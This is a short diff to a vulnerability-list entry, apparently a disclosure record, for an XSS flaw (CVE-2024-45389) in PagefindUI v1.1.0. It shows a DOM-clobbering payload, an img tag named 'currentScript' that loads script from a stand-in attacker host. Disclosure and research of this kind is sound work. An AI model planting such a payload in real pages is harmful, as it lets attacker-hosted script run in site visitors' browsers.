@@ -6,9 +6,9 @@
 + Stars: 3.3K
 + Version: v1.1.0
 + Fingerprint: `typeof PagefindUI !== 'undefined'`
-+ Payload: ```<img name="currentScript" src="blob:https://xxx.xxx.xxx/ui.js"></img>```
++ Payload: ```<img name="currentScript" src="blob:https://attack.hulk/ui.js"></img>```
 + Impact: XSS
-+ CVE: CVE-2024-45389
++ CVE: [CVE-2024-45389](https://nvd.nist.gov/vuln/detail/CVE-2024-45389)
 + Status: Accepted
 + Foundby: TheHulk
 
